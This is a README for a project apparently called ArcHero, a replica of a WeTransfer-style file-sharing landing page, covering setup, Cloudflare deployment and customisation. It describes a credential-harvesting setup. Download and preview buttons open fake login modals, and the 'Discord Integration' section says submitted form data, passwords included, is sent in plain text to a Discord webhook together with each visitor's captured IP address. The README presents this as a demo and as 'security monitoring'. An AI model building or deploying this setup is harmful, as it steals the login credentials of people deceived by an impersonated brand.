# ArcHero — Landing Hero Replica
This project is a visually-exquisite, pixel-accurate replica of a WeTransfer-style marketing hero/landing page. It was built as a demonstration of rapid, high-quality frontend development using modern tools.
![ArcHero Landing Page Screenshot](https://placehold.co/1200x630/2F6BF6/FFFFFF/png?text=ArcHero%20Landing%20Page)
## Project Overview
The application is a single, responsive landing page featuring:
- **Dynamic Hero Variants:** The main headline, subtext, and background accent colors cycle through multiple variants.
- **Interactive Preview Card:** A floating card on the left showcases a mock file list with smooth hover interactions.
- **Gated Content Simulation:** "Download" and "Preview" actions trigger modals that simulate an authentication flow.
- **Video Background:** One of the hero variants features a seamless, looping video background with a graceful fallback to a gradient.
- **Polished UI/UX:** Built with `shadcn/ui`, `Tailwind CSS`, and `Framer Motion` for a beautiful, modern, and interactive user experience.
- **Responsive Design:** The layout is fully responsive and provides an excellent experience on all devices, from mobile phones to large desktops.
## Prerequisites
Before you begin, ensure you have the following installed:
- **[Node.js](https://nodejs.org/) (v18.0 or higher):** Required for npm package management and runtime compatibility.
- **[Cloudflare Account](https://dash.cloudflare.com/sign-up):** Required for deploying the application using Wrangler.
## Setup
To get the project up and running on your local machine, follow these simple steps:
1.  **Clone the repository:**
    ```bash
    git clone <your-repository-url>
    cd arc-hero-landing
    ```
2.  **Install dependencies:**
    ```bash
    npm install
    ```
    This command will install all the necessary packages defined in `package.json`.
3.  **Configure Discord webhook (optional):**
    If you want form submissions to be sent to Discord, create a `.env` file in the project root and add your Discord webhook URL:
    ```bash
    cp .env.example .env
    ```
    Then edit `.env` with your actual webhook URL. You can create a Discord webhook in your server settings under Integrations > Webhooks.
## Running Locally
To start the development server and view the application in your browser:
```bash
npm run dev
```
The application will be available at `http://localhost:3000`. The server supports hot-reloading, so any changes you make to the code will be reflected instantly in the browser.
## Building & Deploying
### Building for Production
To create a production-ready build of the application:
```bash
npm run build
```
This command bundles the frontend assets and the Cloudflare Worker code into the `dist` directory.
### Deploying to Cloudflare
To deploy the application to your Cloudflare account:
```bash
npm run deploy
```
This command uses the Wrangler CLI to publish your application to Cloudflare's global network. You will be prompted to log in to your Cloudflare account if you haven't already.
## Export Options
- **GitHub:** Push your code to a GitHub repository for version control, collaboration, and CI/CD integration.
- **Cloudflare Pages:** The project can also be deployed to Cloudflare Pages, which offers seamless integration with Git providers for automatic deployments.
## Customization
Easily personalize the landing page to match your brand.
### Discord Integration
The application can send form submission data to a Discord channel via webhooks:
1. **Create a Discord webhook:** In your Discord server settings, go to Integrations > Webhooks and create a new webhook.
2. **Configure the webhook URL:** Add `VITE_DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN` to your `.env` file.
3. **Test the integration:** Submit forms on the landing page - you'll see Discord embeds with the form data including IP addresses.
4. **Security note:** Form data including passwords is sent in plain text to Discord for monitoring purposes.
5. **IP Address Tracking:** The user's IP address is automatically captured and included in Discord notifications for security monitoring.

### Changing the Logo
1.  **Create the assets directory:** In the project's root, create a `public` folder if it doesn't exist, and inside it, create an `assets` folder. Your path should be `public/assets/`.
2.  **Add your logo:** Place your logo file inside `public/assets/`. For best results, name it `logo.png` or `logo.svg`. A recommended size is around 120x24 pixels for crisp display.
3.  **Update the code:** Open `src/pages/HomePage.tsx`. Find the `<img>` tag for the logo (it currently uses a `placehold.co` URL) and change its `src` attribute to `"/assets/logo.png"` (or the name of your file). Vite automatically serves files from the `public` directory.
4.  **Verify:** Run `npm run dev` and check that your new logo appears correctly on all screen sizes.
### Adding/Updating the Background Video
The purple hero variant includes a video background.
1.  **Find a video:** Get a short, looping, muted MP4 video. Sites like Pexels or Unsplash are great sources for free assets.
2.  **Update the video source:**
    *   **Remote URL:** In `src/pages/HomePage.tsx`, find the `<video>` element. Replace the existing `src` URL with the new video URL.
    *   **Local File:** Create a `videos` folder inside the `public` directory (`public/videos/`). Place your video file there. Update the `<video>` element's `src` to `"/videos/your-video-name.mp4"`.
3.  **Optimize for performance:**
    *   **Poster Image:** Add a `poster` attribute to the `<video>` tag with a link to a placeholder image. This image will display while the video loads, improving perceived performance.
    *   **Preload:** Ensure the `preload="metadata"` attribute is present. This tells the browser to only fetch the video's metadata (like dimensions and duration) initially, not the entire video file.
4.  **Test:** The video is disabled on mobile devices for performance. Test on a desktop browser to ensure it plays correctly.
## Troubleshooting
- **Preview Not Updating:** If the live preview in your browser doesn't reflect your latest changes, try a hard refresh (Ctrl+Shift+R or Cmd+Shift+R).
- **Console Errors:** Open your browser's developer tools (F12 or Ctrl+Shift+I) and check the console for any error messages. This is the best place to start debugging UI issues.
- **Video Background Issues:** If the video background fails to load, the application will gracefully fall back to a static gradient. If the video consistently fails, try clearing your browser cache or checking your network connection.
---
*Built with ❤️ at Cloudflare*